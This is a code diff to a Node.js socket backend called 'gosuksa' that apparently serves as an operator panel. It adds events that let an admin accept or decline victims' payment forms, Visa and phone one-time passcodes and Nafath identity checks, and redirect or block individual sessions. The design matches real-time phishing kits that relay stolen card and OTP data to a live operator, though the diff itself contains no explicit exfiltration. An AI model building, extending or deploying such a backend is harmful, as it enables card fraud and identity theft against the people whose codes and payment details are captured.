@@ -1,5 +1,5 @@
 /**
- * gosuksa backend — Railway-ready (v6)
+ * gosuksa backend — Railway-ready (v12)
  *
  * Serves two contracts on the same service:
  *
@@ -268,18 +268,45 @@ function recordSubmission(type, payload) {
 
 
 
+const ADMIN_EVENT_ALIASES = {
+  acceptPaymentForm: ["payment:action", "confirmed"],
+  declinePaymentForm: ["payment:action", "cancelled"],
+  acceptVisaOtp: ["otp:action", "confirmed"],
+  declineVisaOtp: ["otp:action", "cancelled"],
+  acceptPhoneOtp: ["otp:action", "confirmed"],
+  declinePhoneOtp: ["otp:action", "cancelled"],
+  acceptPhone: ["phone:action", "confirmed"],
+  declinePhone: ["phone:action", "cancelled"],
+  acceptNavaz: ["nafath:action", "confirmed"],
+  declineNavaz: ["nafath:action", "cancelled"],
+  acceptService: ["payment:action", "confirmed"],
+  declineService: ["payment:action", "cancelled"],
+};
+
 function broadcastAdminEvent(id, event, payload) {
   if (!id) return;
-  io.to(`session:${id}`).emit(event, payload ?? { id });
-  io.to(`user:${id}`).emit(event, payload ?? { id });
-  io.to("admins").emit(`admin:${event}`, { id, payload });
+  const target = io.to(`session:${id}`).to(`user:${id}`);
+  const data = payload ?? { id, uuid: id, userId: id };
+  target.emit(event, data);
+
+  const alias = ADMIN_EVENT_ALIASES[event];
+  if (alias) {
+    const [aliasEvent, action] = alias;
+    target.emit(aliasEvent, { ...data, userId: id, action });
+  } else if (event === "adminRedirect") {
+    target.emit("admin:redirect", data);
+  } else if (event === "clientBlocked") {
+    target.emit("user:blocked", data);
+  }
+
+  io.to("admins").emit(`admin:${event}`, { id, payload: data });
 }
 
 // ---------- REST: health / meta ----------
 app.get("/", (_req, res) => res.json({ ok: true, service: "gosuksa-backend" }));
 app.get("/health", (_req, res) => res.json({ ok: true }));
 
-const APP_VERSION = "v11";
+const APP_VERSION = "v12";
 app.get("/version", (_req, res) =>
   res.json({
     version: APP_VERSION,
@@ -669,7 +696,9 @@ io.on("connection", (socket) => {
         return;
       }
       const data =
-        typeof payload === "object" ? { ...payload, id, uuid: id } : { id };
+        typeof payload === "object"
+          ? { ...payload, id, uuid: id, userId: id }
+          : { id, uuid: id, userId: id };
       delete data.adminToken;
       broadcastAdminEvent(id, ev, data);
       console.log(`[io] admin ${ev} -> ${id}`);
